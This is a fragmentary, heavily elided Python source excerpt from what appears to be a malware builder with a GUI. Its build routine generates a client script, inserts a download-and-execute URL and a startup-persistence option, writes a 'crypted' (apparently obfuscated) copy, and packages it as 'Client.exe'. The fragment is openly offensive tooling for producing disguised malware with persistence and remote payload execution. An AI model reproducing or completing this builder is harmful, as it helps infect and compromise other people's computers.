...
def build_callback():
    try:
        ...
        with open("new_client.py", "w") as new_client_file:
            ...
            modified_client_code = modified_client_code.replace("download_url = False",
                                                                f"download_url = '{url_to_download_execute}'")
            modified_client_code = modified_client_code.replace("enable_startup_copy = False",
                                                                f"enable_startup_copy = {copy_to_startup}")
        ...
        with open("Crypted_new_client.py", "w") as file:
        ...
        if os.path.exists("dist"):
            os.rename("dist/Crypted_new_client.exe", "dist/Client.exe")
...
def create_output_window():
    with dpg.window(pos=(350, 15), no_collapse=True, no_close=True, no_title_bar=True, autosize=True):
